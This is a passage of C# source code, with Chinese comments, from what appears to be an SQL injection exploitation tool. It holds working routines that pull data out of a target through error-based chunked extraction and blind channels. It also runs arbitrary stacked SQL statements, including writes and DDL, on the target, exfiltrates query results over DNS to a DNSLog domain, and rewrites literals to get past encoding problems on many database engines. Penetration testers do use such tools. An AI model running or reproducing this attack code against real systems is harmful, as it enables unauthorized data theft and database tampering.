            return config.DataConfig.HexDecode && !string.IsNullOrEmpty(PayloadFactory.BasePayload.Hex);
        }

        /// <summary>
        /// 报错通道分片取数：先取总长度（数值很短不会被截断），再按步长逐片substr取回拼接。
        /// 步长优先用实测回显净容量（ProbeErrorChunkLen探针二分，缓存到注入记录免重复探测），未探测到时回退模板ErrorChunkLen。
        /// 支持断点续传（复用盲注进度缓存，中断后同payload重跑从断点继续）；单片截断时用ParseTrimmed兜底抢救。
        /// </summary>
        private static async Task<string> ErrorDumpChunked(AppConfig config, string payload)
        {
            int step = config.DataConfig.MeasuredErrorChunkLen;
            if (step <= 0)
            {
                //先尝试运行时探测真实回显容量（MySQL/SQLServer/Oracle/DM）
                step = await ProbeErrorChunkLen(config).ConfigureAwait(false);
            }
            if (step <= 0)
            {
                step = PayloadFactory.BasePayload.ErrorChunkLen;
            }
            if (step <= 0)
            {
                return "";
            }
            string lenExpr = TemplateRenderer.Render(PayloadFactory.BasePayload.Length, ("expr", payload));
            string lenStr = await ErrorDumpSingle(config, lenExpr).ConfigureAwait(false);
            if (!int.TryParse(lenStr, out int total) || total <= 0)
            {
                return "";
            }
            //防御上限，避免异常长度值打爆目标
            total = Math.Min(total, 65535);
            //断点续传：同payload中断重跑时从已取前缀之后继续（断点标记机制）
            string resumeKey = "errchunk:" + payload;
            string partial = GetBlindProgressPrefix(config, resumeKey);
            StringBuilder sb = new StringBuilder(total);
            int startAt = 1;
            if (partial.Length > 0 && partial.Length < total)
            {
                sb.Append(partial);
                startAt = partial.Length + 1;
                Log.SysLog("报错分片断点续取：跳过已获取的前 " + partial.Length + " 个字符");
            }
            try
            {
                for (int s = startAt; s <= total; s += step)
                {
                    config.CheckStop();
                    //vector模式：substr切片同样只做ConcatData标记包装进[QUERY]槽位（同ErrorDumpSingle）
                    string slicePayload = config.DataConfig.IsVectorMode
                        ? PayloadFactory.BPTool.ConcatData(new List<string> { TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", payload), ("start", s), ("len", step)) })
                        : PayloadFactory.BPTool.ErrorDataSubstr(payload, s, step);
                    HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
                    request.Payload = slicePayload;
                    HttpResponse response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
                    string slice = ParseUnionOrErrorData(response, slicePayload);
                    if (string.IsNullOrEmpty(slice) && IsTruncatedMarker(response, slicePayload))
                    {
                        //单片仍被截断（步长偏大）：兜底抢救本片截断部分，抢救到即视为本片完结
                        slice = ParseTrimmed(response, slicePayload);
                        if (!string.IsNullOrEmpty(slice))
                        {
                            sb.Append(slice);
                            break;
                        }
                    }
                    sb.Append(slice);
                    if (slice.Length < step)
                    {
                        //短片=已到数据末尾
                        break;
                    }
                }
            }
            catch
            {
                //中断/停止：把已取部分写回断点缓存，下次同payload续取
                if (sb.Length > 0)
                {
                    _blindProgress[ScopeKey(config, resumeKey)] = sb.ToString();
                    SaveBlindProgress();
                }
                throw;
            }
            _blindProgress.TryRemove(resumeKey, out _);
            SaveBlindProgress();
            return sb.ToString();
        }

        /// <summary>
        /// 堆叠执行任意SQL语句（fire-and-forget，对标业界同类工具 --sql-query的堆叠形态）。
        /// payload结构：" 1=1"闭合注入模板中的and条件 → 分号堆叠目标语句 → "select 1 where 1=1 "吸收模板尾部注释，
        /// 适配检测引擎生成的利用标记位（prefix + " and " + $sql$ + 注释后缀）。
        /// 堆叠语句无通用回显（取决于驱动是否返回多结果集），本方法只保证执行不取数；
        /// 取数请用 GetStringByStacked（DNS外带/时间盲注回退）。
        /// </summary>
        public static async Task<bool> RunStackedSql(AppConfig config, string stmt)
        {
            if (string.IsNullOrWhiteSpace(stmt))
            {
                return false;
            }
            string body = stmt.Trim().TrimEnd(';');
            string payload = " 1=1;" + body + ";select 1 where 1=1 ";
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.Payload = payload;
            await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
            Log.SysLog("堆叠执行：" + body);
            return true;
        }

        /// <summary>
        /// 堆叠注入点取标量值：配置了DNSLog域名且库支持时走DNS外带触发（结果到DNSLog平台拼接），
        /// 否则回退注入点自带的时间盲注通道逐字符获取（堆叠检测命中即证明时间oracle可用）
        /// </summary>
        public static async Task<string> GetStringByStacked(AppConfig config, string expr, int maxLen)
        {
            if (!string.IsNullOrWhiteSpace(config.DataConfig.DnsLogDomain))
            {
                int sent = await DnsExfilTool.SendDnsExfil(config, expr).ConfigureAwait(false);
                if (sent > 0)
                {
                    //配置了API Token则自动轮询回收，否则提示人工到平台拼接
                    string data = await DnsExfilTool.CollectFromDnsLog(config, sent).ConfigureAwait(false);
                    return data ?? "";
                }
            }
            return (await GetStringByBool(config, expr, maxLen).ConfigureAwait(false)) ?? "";
        }

        /// <summary>
        /// 自定义SQL非ASCII字面量加固：请求层固定按UTF-8做URL编码，但目标中间件/应用若以GBK、ISO-8859-1等
        /// 非UTF-8方式解码查询串，SQL里的中文等多字节字面量会变形导致取数错乱（多字节字面量受此限，需手工tamper）。
        /// 这里将含非ASCII字符的字符串字面量改写为纯ASCII的等价表达式，对目标请求解码方式免疫：
        /// MySQL 0x hex字面量、PG/openGauss/金仓/DM chr码点拼接、SQLite/H2/HSQLDB char码点拼接、
        /// SQLServer nchar、Oracle unistr、ClickHouse unhex、Access chrw；
        /// 字节按DbEncoding（目标库连接字符集）生成。注释与标识符不动，未闭合字面量原样保留。
        /// </summary>
        public static string RewriteNonAsciiLiterals(AppConfig config, string userSql)
        {
            if (string.IsNullOrEmpty(userSql) || !userSql.Any(c => c > 127))
            {
                return userSql;
            }
            DBType dbType = config.DataConfig.SelectedDBType;
            string encName = string.IsNullOrWhiteSpace(config.DataConfig.DbEncoding) ? "UTF-8" : config.DataConfig.DbEncoding;
            StringBuilder sb = new StringBuilder(userSql.Length + 32);
            bool rewritten = false, skipped = false;
            int i = 0, n = userSql.Length;
            while (i < n)
            {
                char c = userSql[i];
                //跳过注释：-- 与 # 行注释、/* */ 块注释
                if (c == '-' && i + 1 < n && userSql[i + 1] == '-')
                {
                    int e = userSql.IndexOf('\n', i + 2);
                    if (e < 0) { sb.Append(userSql, i, n - i); break; }
                    sb.Append(userSql, i, e - i + 1); i = e + 1; continue;
                }
                if (c == '#')
                {
                    int e = userSql.IndexOf('\n', i + 1);
                    if (e < 0) { sb.Append(userSql, i, n - i); break; }
                    sb.Append(userSql, i, e - i + 1); i = e + 1; continue;
                }
                if (c == '/' && i + 1 < n && userSql[i + 1] == '*')
                {
                    int e = userSql.IndexOf("*/", i + 2, StringComparison.Ordinal);
                    if (e < 0) { sb.Append(userSql, i, n - i); break; }
                    sb.Append(userSql, i, e + 2 - i); i = e + 2; continue;
                }
                if (c != '\'')
                {
                    sb.Append(c); i++; continue;
                }
                //字符串字面量（''为转义单引号）
                int j = i + 1;
                bool closed = false, hasHigh = false;
                while (j < n)
                {
                    char d = userSql[j];
                    if (d == '\'')
                    {
                        if (j + 1 < n && userSql[j + 1] == '\'') { j += 2; continue; }
                        closed = true; break;
                    }
                    if (d > 127) { hasHigh = true; }
                    j++;
                }
                if (!closed)
                {
                    sb.Append(userSql, i, n - i); break;
                }
                string rawLiteral = userSql.Substring(i, j - i + 1);
                if (!hasHigh)
                {
                    sb.Append(rawLiteral);
                }
                else
                {
                    //还原字面量文本（''→'）后构造等价安全表达式；不支持则保留原文
                    string text = userSql.Substring(i + 1, j - i - 1).Replace("''", "'", StringComparison.Ordinal);
                    string? replacement = BuildAsciiSafeLiteral(dbType, text, encName);
                    if (replacement != null) { sb.Append(replacement); rewritten = true; }
                    else { sb.Append(rawLiteral); skipped = true; }
                }
                i = j + 1;
            }
            if (rewritten)
            {
                Log.Show("自定义SQL含非ASCII字面量，已改写为纯ASCII安全形式（防目标请求解码非UTF-8导致中文变形）");
            }
            if (skipped)
            {
                Log.Warning($"当前库({dbType})暂不支持字面量安全改写，若目标以非UTF-8解码请求，中文结果可能错乱（可手工hex/char构造）！");
            }
            return sb.ToString();
        }

        /// <summary>构造纯ASCII的字符串字面量等价表达式；不支持的库返回null（保留原文）</summary>
        private static string? BuildAsciiSafeLiteral(DBType dbType, string text, string encName)
        {
            if (string.IsNullOrEmpty(text))
            {
                return null;
            }
            switch (dbType)
            {
                case DBType.MySQL:
                    //0x hex字面量，字节按DbEncoding（目标连接字符集）生成
                    return TextCodec.StrToHex(text, encName);
                case DBType.ClickHouse:
                    //ClickHouse字符串即字节序列：unhex直接还原
                    return string.Concat("unhex('", TextCodec.StrToHex(text, encName).AsSpan(2), "')");
                case DBType.PostgreSQL:
                case DBType.OpenGauss:
                case DBType.Kingbase:
                case DBType.DM:
                    //chr按Unicode码点拼接
                    return string.Join("||", text.EnumerateRunes().Select(r => "chr(" + r.Value + ")"));
                case DBType.SQLite:
                case DBType.H2:
                case DBType.HSQLDB:
                    //char按Unicode码点拼接
                    return string.Join("||", text.EnumerateRunes().Select(r => "char(" + r.Value + ")"));
                case DBType.SQLServer:
                    //nchar按UTF-16码元拼接（代理项对天然兼容）
                    return string.Join("+", text.Select(c => "nchar(" + (int)c + ")"));
                case DBType.Oracle:
                    //unistr('\XXXX' UTF-16码元转义）
                    return "unistr('" + string.Concat(text.Select(c => "\\" + ((int)c).ToString("x4"))) + "')";
                case DBType.Access:
                    //ChrW按UTF-16码元拼接
                    return string.Join("&", text.Select(c => "ChrW(" + (int)c + ")"));
                default:
                    return null;
            }
        }

        /// <summary>
        /// 任意SQL执行封装（sql-query 能力）：用户SQL按标量子查询经当前注入通道取回结果。
        /// SQL需返回单行单列（多行自行LIMIT 1；多列自行用concat拼接）。
        /// 通道选择：Union→union显示位；Error→报错回显；Blind→盲注逐字符（maxLen限长防跑飞）；
        /// Stacked→非SELECT语句堆叠直发执行，SELECT查询回退时间盲注取值。
        /// 入口自动做非ASCII字面量加固（RewriteNonAsciiLiterals），防目标请求解码非UTF-8导致中文变形。
        /// </summary>
        public static async Task<string> RunUserSql(AppConfig config, string userSql)
        {
            if (string.IsNullOrWhiteSpace(userSql))
            {
                return "";
            }
            //非ASCII字面量加固（防目标请求解码非UTF-8导致中文变形）
            userSql = RewriteNonAsciiLiterals(config, userSql);
            //去掉尾部分号，包成标量子查询
            string expr = "(" + userSql.Trim().TrimEnd(';') + ")";
            InjectType type = config.DataConfig.SelectedInjectType;
            switch (type)
            {
                case InjectType.Union:
                    return await DataDumpWithNoFrom(config, expr).ConfigureAwait(false);
                case InjectType.Error:
                    return await DataDumpWithError(config, expr).ConfigureAwait(false);
                case InjectType.Blind:
                case InjectType.Time:
                    return (await GetStringByBool(config, expr, 4096).ConfigureAwait(false)) ?? "";
                case InjectType.Dns:
                    //DNS盲注：SELECT结果经DNS外带取回（GetStringByBool内部按Dns类型路由）
                    return (await GetStringByBool(config, expr, 4096).ConfigureAwait(false)) ?? "";
                case InjectType.Stacked:
                    //非SELECT语句（写操作/DDL/命令类）：堆叠直发执行，无回显
                    if (!userSql.TrimStart().StartsWith("select", StringComparison.OrdinalIgnoreCase))
                    {
                        await RunStackedSql(config, userSql).ConfigureAwait(false);
                        Log.Show("堆叠语句已执行（无回显），请人工确认执行效果！");
                        return "";
                    }
                    //SELECT查询：有DNSLog走外带触发，否则回退时间盲注取值
                    return await GetStringByStacked(config, expr, 4096).ConfigureAwait(false);
                default:
                    //未标注类型时按利用价值依次尝试
                    string data = await DataDumpWithNoFrom(config, expr).ConfigureAwait(false);
                    if (string.IsNullOrWhiteSpace(data))
                    {
                        data = await DataDumpWithError(config, expr).ConfigureAwait(false);
                    }
                    if (string.IsNullOrWhiteSpace(data))
                    {
                        data = (await GetStringByBool(config, expr, 4096).ConfigureAwait(false)) ?? "";
                    }
                    return data;
            }
        }
    }

}
